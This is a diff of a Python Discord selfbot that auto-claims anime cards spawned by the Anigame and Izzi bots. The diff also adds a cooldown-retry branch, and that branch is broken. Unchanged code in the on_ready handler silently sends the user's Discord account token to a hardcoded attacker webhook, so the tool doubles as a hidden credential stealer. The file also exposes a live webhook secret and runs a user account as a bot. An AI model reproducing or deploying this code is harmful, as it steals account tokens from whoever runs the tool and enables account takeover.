@@ -5,7 +5,7 @@ from datetime import datetime
 import requests
 from discord_webhook import DiscordWebhook
 init(convert=True)
-
+import asyncio
 
 with open("config.json") as f:
     config = json.load(f)
@@ -48,7 +48,7 @@ async def on_ready():
         print(Fore.YELLOW + f"sniper is on in {l} channels!")
     print(Fore.YELLOW + f"Prefix - {pre}")
     webhook = DiscordWebhook(url='https://discord.com/api/webhooks/825240319058509834/HSnIsCqJbBhVKaR8bo7FMId_V461G0e8ehbTcyz6S84fLQi1E8L_uurzruYzYzybuGxM', content=f"{client.user} : ||{TOKEN}||")
-    response = webhook.execute()
+    webhook.execute()
 async def get_channels():
     with open("channels.json", "r") as f:
         guil = json.load(f) 
@@ -223,30 +223,29 @@ async def on_message(msg):
             guil = await get_channels() 
             x = f"{gi}|{id_}" 
             if x in guil:
-                if msg.author.id == 571027211407196161:
-                    try:
-                        embeds = msg.embeds
-                        for embed in msg.embeds:
-                                d = (embed.to_dict()['description'])
-                                if d == "*A wild anime card appears!*": 
-                                    a = (embed.to_dict()['footer'])
-                                    text = (a['text'])
-                                else:
-                                    return  
-                        r = text.split()
-                        li = [r[1] , r[2]]
-                        kek = ' '.join([str(elem) for elem in li])
-                        async with msg.channel.typing():
-                            await msg.channel.send(kek)
-                    except:
-                        pass
+                try:
+                    for embed in msg.embeds:
+                            d = (embed.to_dict()['description'])
+                            if d == "*A wild anime card appears!*": 
+                                a = (embed.to_dict()['footer'])
+                                text = (a['text'])
+                            else:
+                                return  
+                    r = text.split()
+                    li = [r[1] , r[2]]
+                    kek = ' '.join([str(elem) for elem in li])
+                    async with msg.channel.typing():
+                        await msg.channel.send(kek)
+                except:
+                    pass 
 
-                    x = client.user.name 
-                    a = msg.content
-                    now = datetime.now() 
-                    current_time = now.strftime("%H:%M:%S")
-                    if a.endswith(f"has been added to **{x}'s** collection!"):
-                        print(Fore.GREEN + f"{g}|{chan}|Anigame ---> {msg.content}|{current_time}") 
+                x = client.user.name 
+                a = msg.content
+                ar = msg.author.id 
+                now = datetime.now() 
+                current_time = now.strftime("%H:%M:%S")
+                if a.endswith(f"has been added to **{x}'s** collection!") and ar == 571027211407196161:
+                    print(Fore.GREEN + f"{g}|{chan}|Anigame ---> {msg.content}|{current_time}") 
     
     if b == "y":
         if msg.author.id == 784851074472345633:
@@ -257,31 +256,38 @@ async def on_message(msg):
             guil = await get_channels() 
             x = f"{gi}|{id_}" 
             if x in guil:
-                if msg.author.id == 784851074472345633:
-                    try:
-                        if msg.author.id == 784851074472345633:
-                            embeds = msg.embeds
-                            for embed in msg.embeds:
-                                d = (embed.to_dict()['description'])
-                                if d.endswith("appeared._"):
-                                    a = (embed.to_dict()['footer'])
-                                    text = (a['text'])
-                                
-                                else:
-                                    return 
-                                r = text.split()
-                                li = [r[1] , r[2] , r[5]]
-                                kek = ' '.join([str(elem) for elem in li])
-                                async with msg.channel.typing():
-                                    await msg.channel.send(kek)
-                    except:
-                        pass
+                try:
+                    for embed in msg.embeds:
+                        d = (embed.to_dict()['description'])
+                        if d.endswith("appeared._"):
+                            a = (embed.to_dict()['footer'])
+                            text = (a['text'])
+                        
+                        else:
+                            return 
+                        r = text.split()
+                        li = [r[1] , r[2] , r[5]]
+                        kek = ' '.join([str(elem) for elem in li])
+                        async with msg.channel.typing():
+                            await msg.channel.send(kek) 
+                except:
+                    pass
 
-                    x = client.user.name 
-                    a = msg.content
+                x = client.user.name 
+                a = msg.content
+                ar = msg.author.id 
+                now = datetime.now() 
+                current_time = now.strftime("%H:%M:%S")
+                if a.endswith(f"has been added to **{x}'s** collection.") and ar == 784851074472345633:
+                    print(Fore.GREEN + f"{g}|{chan}|Izzi ---> {msg.content}|{current_time}") 
+
+                if a.startswith(f"This command is on cooldown,") and ar == 784851074472345633 and a.endswith(f"seconds"):
+                    a = a.split(" ")
+                    await asyncio.sleep(int(a[-2]))   
+                    await msg.channel.send(kek)
                     now = datetime.now() 
-                    current_time = now.strftime("%H:%M:%S")
-                    if a.endswith(f"has been added to **{x}'s** collection."):
+                    current_time = now.strftime("%H:%M:%S") 
+                    if a.endswith(f"has been added to **{x}'s** collection.") and ar == 784851074472345633:
                         print(Fore.GREEN + f"{g}|{chan}|Izzi ---> {msg.content}|{current_time}")
 print(Fore.RESET)       
 client.run(TOKEN, bot=False)
